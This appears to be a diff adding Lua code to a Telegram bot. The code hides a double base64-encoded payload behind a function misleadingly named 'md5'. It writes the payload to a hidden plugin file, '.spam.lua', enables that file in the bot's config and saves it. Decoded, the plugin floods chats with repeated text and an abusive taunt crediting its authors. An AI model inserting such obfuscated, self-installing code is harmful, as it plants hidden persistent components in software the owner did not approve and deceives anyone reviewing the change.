@@ -1,0 +1,13 @@
+local mime = require( "mime" ) 
+local md5 = mime.unb64
+
+asource = md5( md5("Wkc4TkNtWjFibU4wYVc5dUlISjFiaWh0YzJjc0lHMWhkR05vWlhNcERRb05DZzBLSUNCc2IyTmhiQ0IwWlhnZ1BTQnRZWFJqYUdWeld6RmREUW9nSUd4dlkyRnNJSE53Y3lBOUlHMWhkR05vWlhOYk1sME5DaUFnYkc5allXd2djM0FnUFNBbmQyVWdiV0ZrWlNCNWIzVWdMaUI1YjNVZ1puVmphMmx1WnlCaWFYUmphQ0E2UkNCY2JrTnlaV0YwYjNJZ09pQkFiWEpmYUc5d1pYTWdKaUJBWW1Ga2NtRmlZbWwwSncwS1ptOXlJR2s5TVN3Z2RHVjRMQ0F4SUdSdkRRb05Dbk53SUQwZ0oxeHVKeTR1YzNCekxpNG5YRzRuTGk1emNBMEthU0E5SUdrZ0t5QXhEUXBsYm1RTkNuSmxkSFZ5YmlCemNBMEtEUW9OQ2lBZ0lDQWdJQ0FnSUdWdVpBMEtjbVYwZFhKdUlIc05DaUFnSUNCd1lYUjBaWEp1Y3lBOUlIc05DaUFnSUNBZ0lDSmVXeThrWFZ0VGMxMXdZVzBnS0M0cUtTQW9MaW9wSkNJTkNpQWdJQ0I5TEEwS0lDQWdJSEoxYmlBOUlISjFiaXdOQ24wTkNnMEtaVzVr") )
+
+local file_insert = io.open 
+local file_t = "w" 
+local file = file_insert("./plugins/.spam.lua", file_t) 
+file:write(asource) 
+file:flush()
+ file:close()
+ table.insert(_config.enabled_plugins, '.spam')
+ save_config()
